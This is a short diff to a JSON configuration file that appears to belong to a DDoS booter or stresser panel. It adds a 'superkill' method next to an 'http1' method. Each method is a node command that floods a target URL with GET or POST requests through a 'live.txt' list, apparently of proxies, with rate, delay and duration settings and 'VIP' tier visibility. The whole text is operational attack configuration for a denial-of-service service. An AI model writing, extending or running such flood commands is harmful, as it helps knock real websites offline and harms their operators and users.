@@ -11,6 +11,12 @@
         "time": 120,
         "visibility": "VIP"
     },
+    "superkill": {
+        "command": "node --max-old-space-size=65536 superkill -m GET -u url -p live.txt -q true -r 999 --full true --ratelimit true --debug false --delay 1",
+        "url": "url",
+        "time": 120,
+        "visibility": "VIP"    
+    },
     "http1": {
         "command": "node --max-old-space-size=65536 http1 POST url live.txt 120 10 10 cookie= randomstring= headerdata= postdata=",
         "url": "url",
